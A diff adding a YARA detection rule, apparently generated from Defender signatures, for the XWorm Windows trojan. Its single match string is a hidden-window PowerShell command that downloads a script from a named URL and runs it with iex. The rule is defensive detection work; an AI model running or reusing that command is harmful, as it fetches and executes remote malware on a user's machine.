@@ -411,3 +411,24 @@ rule Trojan_Win64_XWorm_GHM_2147963033_0
         (all of ($x*))
 }
 
+rule Trojan_Win64_XWorm_A_2147964176_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win64/XWorm.A!AMTB"
+        threat_id = "2147964176"
+        type = "Trojan"
+        platform = "Win64: Windows 64-bit platform"
+        family = "XWorm"
+        severity = "Critical"
+        info = "AMTB: an internal category used to refer to some threats"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "2"
+        strings_accuracy = "High"
+    strings:
+        $x_2_1 = "-NoProfile -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadString('http://atualizadoativado.com/0/0.ps1') | iex\"" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
